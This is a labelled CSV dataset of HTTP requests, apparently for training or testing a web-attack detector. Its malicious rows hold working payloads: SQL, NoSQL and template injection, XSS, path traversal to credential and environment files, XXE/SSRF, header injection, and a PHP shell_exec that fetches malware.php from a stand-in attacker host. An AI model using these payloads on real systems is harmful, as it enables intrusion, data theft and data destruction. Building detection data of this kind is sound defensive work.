label,text
benign,"GET /stream/data/live-updates?channel=sports&event=football&quality=high&format=json&include_comments=true&max_retries=5&client_version=5.2.1&accept_gzip=true&lang=en-US&region=NA&session_id=c09a3c76c2e74989 HTTP/1.1
Host: realtime-streaming-hub.tv
Connection: keep-alive
Accept: application/json
User-Agent: python-requests/2.28.2
X-CSRF-Token: a73b57e9933acae6398c4b6b007e85e5"
malicious,"GET /user/login?username=guest&%75%73%65%72%6E%61%6D%65=admin'-- HTTP/1.1
Host: fast-login-portal.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Pragma: no-cache"
benign,"GET /user/avatar/85432 HTTP/1.1
Host: secure-user-portal.net
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Cookie: session=4a9bd1c788bfddf8a2d61c7eeeab1766; prefs=lang=en-US
Accept-Encoding: br, gzip
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"POST /api/v2/community/posts/new HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.88.1
Content-Type: application/json
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 109
Connection: close

{""title"":""Tips for improving AI pathfinding"",""content"":""Has anyone experimented with flowfield algorithms for NPC navigation?"", ""tags"":[""AI"",""pathfinding"",""game-dev""]}"
benign,"GET /products/search?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: online-retail-store.biz
Accept: */*
User-Agent: curl/7.88.1
Accept-Encoding: identity
Connection: close"
benign,"GET /discussions/thread?id=thread-9b6d2a7f HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G9980) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Mobile Safari/537.36
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /feedback/submit HTTP/1.1
Host: community.game-dev-forum.org
Connection: close
Content-Type: application/xml
Content-Length: 111
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Accept: text/xml,application/xml
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/feedback

<feedback>
  <threadId>4789</threadId>
  <userId>3142</userId>
  <message>Suggestion: add more beginner tutorials on physics engine integration.</message>
</feedback>"
malicious,"POST /app/contact/send-message HTTP/1.1
Host: contact-support-haven.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Content-Length: 128

email=alice%40mailservice.info&message=Thank+you+for+the+help%21+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fexploiters-zone.biz%2Fmalware.php+-O+%2Ftmp%2Fbad.php%27%29%3B+%3F%3E"
benign,"GET /api/v1/tasks?cmd=list_active HTTP/1.1
Host: enterprise-workflow-suite.co
User-Agent: python-requests/2.28.2
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"POST /profile/preferences/save HTTP/1.1
Host: my-digital-garden.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
User-Agent: curl/7.88.1
Accept: */*
Connection: keep-alive
X-Forwarded-For: 198.51.100.125

notification_pref=email&dark_mode=on&font_size=medium"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fapi.cloud-data-services.ai%2Fv1%2Fresources%2Finfo HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
User-Agent: curl/7.88.1
Connection: close"
benign,"GET /forum/thread/19723 HTTP/1.1
Host: community.tech-garden.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
benign,"POST /signup/new HTTP/1.1
Host: tech-solutions-cloud.io
Content-Type: application/json
Accept: application/json
Origin: https://tech-solutions-cloud.io
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Length: 139
Connection: keep-alive

{""registration"":{""username"":""miguel.santos"",""email"":""miguel.santos@tech-solutions-cloud.io"",""password"":""CloudPass#88"",""fullName"":""Miguel Santos""}}"
benign,"POST /signup HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://api.cloud-data-services.ai
Referer: https://api.cloud-data-services.ai/signup
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Cookie: cart_id=3445df31a092ae87
Connection: keep-alive

username=sarah_w&email=sarah.w%40cloud-data-services.ai&password=SeCur3Key$42&password_confirm=SeCur3Key$42&terms_accepted=true"
benign,"PUT /api/v2/user/475/settings HTTP/1.1
Host: dev-environment.apps.internal
Authorization: Bearer eyJzdWIiOiJ1c2VyNDc1IiwibmFtZSI6IkpvaG4gRG9lIn0.
Origin: https://dev-environment.apps.internal
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Content-Length: 68

{""dashboardLayout"": ""compact"", ""enableBetaFeatures"": false, ""timezone"": ""America/New_York""}"
malicious,"PATCH /api/custom_data/store HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 346
Origin: https://console.api.cloud-data-services.ai
X-Requested-With: FetchAPIClient
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: application/json
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""config-params"",
  ""region"": ""us-west-2"",
  ""deployment"": ""blue-green"",
  ""active"": false
}"
malicious,"GET /media/%2e%2e/%2e%2e/%2e%2e/db/backups/config.yaml HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/yaml,application/x-yaml,text/plain;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /search?q=latest+smartphone+reviews HTTP/1.1
Host: gadgetinsights.io
User-Agent: curl/7.88.0
Accept: text/html
Referer: https://gadgetinsights.io/
Connection: close"
benign,"GET /dashboard/activity?user_id=1572839&filter=logins&filter=uploads&start_date=2024-05-10&end_date=2024-06-14&timezone=America%2FLos_Angeles&sort=desc&limit=50&page=1&format=csv&include_deleted=false HTTP/1.1
Host: secure-user-portal.net
Accept: text/csv,application/vnd.ms-excel;q=0.9,*/*;q=0.8
Connection: keep-alive
Referer: https://secure-user-portal.net/dashboard
Accept-Encoding: gzip, deflate
User-Agent: curl/7.83.1"
benign,"GET /products;category=books/collections/award-winners HTTP/1.1
Host: curated-literature-cloud.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
malicious,"POST /app/user/feedback HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/xml
Accept: application/xml, text/plain, */*
Accept-Language: en-US,en;q=0.8
Content-Length: 219
Connection: keep-alive

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:8080/admin_panel"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>"
benign,"GET /fetch/metadata?url=https%3A%2F%2Fapi.cloud-data-services.ai%2Fresources%2Fdoc%2F123456 HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; SM-G998B Build/QP1A.190711.020)
Accept-Language: en-US
Connection: keep-alive"
benign,"POST /user/images/update HTTP/1.1
Host: subscription-media-services.xyz
Accept-Language: en-US,en;q=0.9
Content-Type: multipart/form-data; boundary=--MyBoundaryTest
User-Agent: curl/7.88.1
Content-Length: 499

--MyBoundaryTest
Content-Disposition: form-data; name=""profile_pic""; filename=""user_avatar.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
--MyBoundaryTest
Content-Disposition: form-data; name=""cover_pic""; filename=""user_cover.jpg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
--MyBoundaryTest--"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: media-content-hub.io
Connection: keep-alive
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9"
benign,"DELETE /api/v4/clients/abcdef123 HTTP/1.1
Host: client-management.biz
Authorization: Bearer Uip45lkny09qwerXDFV23
If-Match: ""abc123etag56""
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Via: 1.1 varnish
Connection: keep-alive"
benign,"GET /products/books/antique-collectibles HTTP/1.1
Host: oldworld-collectibles.com
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Cookie: session=ZkW3lnc2JiNQYPuLmolwt8naqX1mVXxW
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:80.0) Gecko/20100101 Firefox/80.0
Connection: keep-alive"
benign,"POST /login HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Accept-Language: en-GB,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Cache-Control: max-age=0
Origin: https://secure-user-portal.net

username=john.doe&password=&remember_me=yes"
benign,"GET /products/outdoor/garden-furniture HTTP/1.1
Host: freshhomegoods.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Connection: close
Pragma: no-cache
Cache-Control: no-cache"
benign,"PUT /upload_screenshots/app_ui_20240421_1130.b64 HTTP/1.1
Host: bugtracker-apps.development.team
Content-Type: application/octet-stream
Content-Length: 112
Referer: https://bugtracker-apps.development.team/dashboard
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: keep-alive

U2NyZWVuc2hvdCBpbWFnZSBvZiB0aGUgYnVnIGZpeCBzY3JlZW5zaG90IGZvciBhcHAgZGV2ZWxvcG1lbnQu"
benign,"GET /avatars/active HTTP/1.1
Host: workforce-employee-hub.com
Accept: image/avif,image/webp,*/*
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Cookie: authToken=3ddmph4ghklsa0dtvu74v9z0vf
Connection: keep-alive"
benign,"GET /static/v3/css/mobile-styles.css HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Android 10; Mobile; LG-M255; rv:86.0) Gecko/86.0 Firefox/86.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/css,*/*;q=0.1
Accept-Encoding: br,gzip,deflate
Connection: keep-alive
Accept-Language: en-US,en;q=0.9"
malicious,"POST /login HTTP/1.1
Host: financial-trades-platform.eu
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Content-Length: 253
Accept: application/json
Cookie: authid=9f7d6c5b426a31de
Accept-Encoding: br, gzip, deflate

{
  ""return_url"": ""/dashboard/main%0d%0aLocation:%20http://malicious.financial-trades-platform.eu/phish%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><head><title>Hacked</title></head><body>Phishing</body></html>"",
  ""remember_me"": false
}"
benign,"GET /documents/download?file=report-final.pdf HTTP/1.1
Host: finance-data-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/pdf,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Referer: https://finance-data-hub.net/reports/overview"
benign,"GET /products/electronics/tv/details?id=2914 HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"POST /api/v1/orders HTTP/1.1
Host: hawk-gear-supplies.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Cookie: user=client82; tracking_id=qm23' OR IF(ASCII(SUBSTRING((SELECT password FROM users /*!*/ WHERE username='admin'),1,1))=97, SLEEP(5),0) -- 
Content-Length: 27

item_id=7821&quantity=3"
malicious,"POST /api/v1/messages/send HTTP/1.1
Host: messaging.enterprise-solutions.cloud
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept-Language: en-US,en;q=0.9
Origin: https://dashboard.enterprise-solutions.cloud
Cookie: sessionToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.gHf3jQvJY7L1qRQ_fU1rHridv0PzTm3Y

{
  ""recipient_id"": 5427,
  ""message"": ""Hello, please find the attachment."",
  ""custom_greeting"": ""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""
}"
benign,"POST /account/password-reset HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Connection: close
User-Agent: curl/7.85.0
Accept: */*

email=amelia.jones%40mpblog.info&callback=%2Faccount%2Fpassword-reset-confirmation"
benign,"GET /robots.txt HTTP/1.1
Host: media-streaming-hub.tv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/plain, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /app/user/settings?param=Hello%2520World HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: https://secure-user-portal.net/profile
Connection: keep-alive
Cookie: session_id=184f2a78c992d5b8b271a0d0c33e2f69"
malicious,"POST /api/metadata/update HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 351
Origin: https://dashboard.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""session_update"",
  ""updateField"": ""location"",
  ""location"": ""us-west-2"",
  ""userId"": ""user_934857"",
  ""authToken"": ""NTFjMWQ2YzQtZTg2OS00ZDQyLWJiMWItMzNkNjY4YTAxOThl""
}"
benign,"OPTIONS /v3/projects/432118/config HTTP/1.1
Host: api.devops-management.ai
Origin: https://web-ui.devops-portal.biz
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0 Mobile Safari/537.36
Accept: */*
DNT: 1
Connection: keep-alive"
benign,"GET /app/settings?exec=refresh_profile HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Referer: https://secure-user-portal.net/app/dashboard
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Connection: close"
malicious,"GET /user/profile/view?id=54 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 $(whoami) (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community.game-dev-forum.org/home"
benign,"PUT /api/v1/users/8472/profile HTTP/1.1
Host: profile-update-service.tech
Content-Type: application/json
Content-Length: 56
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive

{""bio"": ""Enthusiast of &lt;code&gt;Python&lt;/code&gt; and &lt;b&gt;HTML&lt;/b&gt;!""}"
malicious,"GET /app/media?image=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afproc%c0%afself%c0%afenviron HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://online-retail-store.biz/shop/cart
Connection: keep-alive"
benign,"GET /reports/daily?exec=fetch_summary&date=2024-06-05 HTTP/1.1
Host: data-insights-center.net
User-Agent: Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"GET /media/photos/2024/event-highlights.jpg HTTP/1.1
Host: community.game-dev-forum.org
Accept: image/webp,image/apng,image/*,*/*;q=0.8
DNT: 1
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: br,gzip
Connection: keep-alive"
benign,"GET /search?q=wireless+keyboards HTTP/1.1
Host: gadgets-marketplace.net
X-Forwarded-For: 10.0.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /events/%F0%9F%8E%89%E5%B9%B4%E5%B8%83%E8%A3%85 HTTP/1.1
Host: celebrate-moments.today
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.7,en;q=0.5
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"POST /app/user/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 185
Accept: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15

{""email"":""user.diane74@secure-user-portal.net"",""notifications"":true,""profile_bio"":""Experienced developer. Visit: javascript:alert('XSS')"",""theme"":""dark""}"
benign,"POST /soap/CustomerService HTTP/1.1
Host: clientdata-platform.ai
Authorization: Bearer QWERTYUIOPLKJHGFDSAZXCVBNM123456
Content-Type: application/xml
Accept: application/xml
User-Agent: curl/7.85.0
Content-Length: 243
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?>
<CustomerRequest>
  <Customer>
    <FirstName>Elena</FirstName>
    <LastName>Martinez</LastName>
    <Email>elena.martinez@domainmail.ai</Email>
    <Phone>+1-415-555-7890</Phone>
    <Address>
      <Street>4123 Oak St</Street>
      <City>San Francisco</City>
      <State>CA</State>
      <Zip>94107</Zip>
    </Address>
  </Customer>
</CustomerRequest>"
malicious,"PUT /api/v1/email/template HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""83"", ""Google Chrome"";v=""83""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Content-Length: 221

{""email_template"":{""subject"":""Hi"", ""body"":""<!--#exec cmd=\""ec\""\""h\"" ' /var/logs/syslog'"" -->""}}"
benign,"GET /search/results?q=summer+festival HTTP/1.1
Host: city-events-calendar.co
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: https://city-events-calendar.co/home
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1"
malicious,"GET /images/fetch?imageUrl=http%3A%2F%2Fcdn-media-gallery.info%2Fimages%2Fgallery%2Fpic.jpg&imageUrl=http%3A%2F%2F172.16.0.1%2Fconfig%2Fsettings&quality=standard HTTP/1.1
Host: cdn-media-gallery.info
User-Agent: Python-urllib/3.8
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"PUT /api/v1/sessions/ab12cd34/extend HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer ZDhc87vKjQpllteG41xrYAaVcXe9PzTD
Origin: https://my-personal-blog-site.info
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Length: 55

{""extendByMinutes"":30,""reason"":""User requested session extension.""}"
malicious,"POST /feedback/submit HTTP/1.1
Host: express-delivery-service.org
User-Agent: Wget/1.21.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Accept: */*
Origin: https://express-delivery-service.org

comments=Great%20service!'});db.orders.deleteMany({}); //&rating=5"
malicious,"GET /dashboard/home HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 <script>alert('LogViewerXSS')</script> (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"GET /search HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Referer: http://search.community.game-dev-forum.org/{#{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('env').read()}}#}"
benign,"GET /blog/post/view/2024-06-spotlight?narrative=In+an+exploration+of+the+emerging+technology+trends%2C+this+article+covers+AI%2C+edge+computing%2C+and+sustainable+energy+solutions+shaping+the+future HTTP/1.1
Host: tech-insights-journal.io
Accept: text/html
Referer: https://tech-insights-journal.io/blog/home
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Connection: keep-alive"
benign,"GET /files/view?file=invoice_2023_08_final.pdf HTTP/1.1
Host: secure-finance-portal.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept: application/pdf
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
Cookie: sessionID=3f7290ef7dc448986b2c40f776d5e89f"
benign,"GET /research/papers/2023/ai-ethics.html HTTP/1.1
Host: institute-innovation-research.edu
Connection: keep-alive
If-Modified-Since: Thu, 15 Jun 2023 16:45:00 GMT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Referer: https://institute-innovation-research.edu/research/papers/
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
benign,"GET /v1/data/query?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: api.clouddata-hub.org
Accept: application/json
User-Agent: curl/7.85.0
DNT: 1
Connection: close"
benign,"POST /register-new HTTP/1.1
Host: event-signup-hub.online
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive

email=emily.rivera%40mailservice.net&promoCode="
